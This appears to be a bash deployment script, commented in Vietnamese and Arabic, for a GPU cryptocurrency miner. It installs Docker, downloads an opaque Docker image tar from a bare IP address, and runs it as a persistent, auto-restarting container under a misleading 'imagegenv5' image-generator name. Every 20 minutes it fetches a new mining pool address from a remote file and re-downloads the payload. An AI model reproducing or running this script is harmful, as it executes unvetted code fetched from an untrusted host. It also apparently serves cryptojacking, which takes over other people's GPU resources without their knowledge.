#!/bin/bash

# URL ملف صورة Docker tar على سيرفرك
IMAGE_TAR_URL="http://45.61.151.35/imagegenv5.tar"
IMAGE_TAR_LOCAL="/tmp/imagegenv5.tar"
IMAGE_NAME="riccorg/imagegenv5:latest"

# Hàm cập nhật mining pool và khởi động lại container nếu pool thay đổi
update_and_restart() {
    new_pool_url=$(curl -s https://raw.githubusercontent.com/anhacvai11/bash/refs/heads/main/ip) # Đọc pool mới từ URL
    if [ "$new_pool_url" != "$POOL_URL" ]; then
        echo "Updating POOL_URL to: $new_pool_url"
        export POOL_URL=$new_pool_url

        # Dừng & xóa container cũ trước khi chạy mới
        docker stop rvn-test 2>/dev/null
        docker rm rvn-test 2>/dev/null

        # تحميل ملف الصورة وتحديث الصورة محليًا
        echo "Downloading latest image tar..."
        curl -fsSL $IMAGE_TAR_URL -o $IMAGE_TAR_LOCAL

        echo "Loading image into Docker..."
        docker load -i $IMAGE_TAR_LOCAL

        # تشغيل الحاوية بالصورة الجديدة مع GPU
        docker run --gpus all -d --restart unless-stopped --name rvn-test $IMAGE_NAME
    else
        echo "No updates found."
    fi
}

# Cài đặt Docker nếu chưa có
install_docker() {
    sudo apt-get update --fix-missing
    sudo apt-get install -y \
        apt-transport-https \
        ca-certificates \
        curl \
        software-properties-common
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
    echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
    sudo apt-get update --fix-missing
    sudo apt-get install -y docker-ce docker-ce-cli containerd.io
}

# Kiểm tra Docker tồn tại hay không và cài đặt nếu cần
check_docker() {
    if ! command -v docker &> /dev/null; then
        echo "Docker chưa được cài đặt. Đang cài đặt Docker..."
        install_docker
    else
        echo "Docker đã được cài đặt."
    fi
}

# Kiểm tra Docker trước tiên
check_docker

# Kiểm tra GPU trước khi chạy mining
echo "Kiểm tra GPU..."
docker run --rm --gpus all nvidia/cuda:12.2.0-base-ubuntu22.04 nvidia-smi

# تحميل ملف الصورة وتحديثها محليًا في بداية التشغيل
echo "Downloading image tar..."
curl -fsSL $IMAGE_TAR_URL -o $IMAGE_TAR_LOCAL

echo "Loading image into Docker..."
docker load -i $IMAGE_TAR_LOCAL

# Dừng & xóa container cũ nếu đang chạy
docker stop rvn-test 2>/dev/null
docker rm rvn-test 2>/dev/null

# Chạy Docker container mining với GPU (WALLET và POOL đã có sẵn trong Dockerfile)
docker run --gpus all -d --restart unless-stopped --name rvn-test $IMAGE_NAME

# Đợi một chút trước khi vào vòng lặp kiểm tra
sleep 10

# Vòng lặp kiểm tra liên tục (cập nhật pool mỗi 20 phút)
while true; do
    sleep 1200  # Kiểm tra mỗi 20 phút
    update_and_restart
done
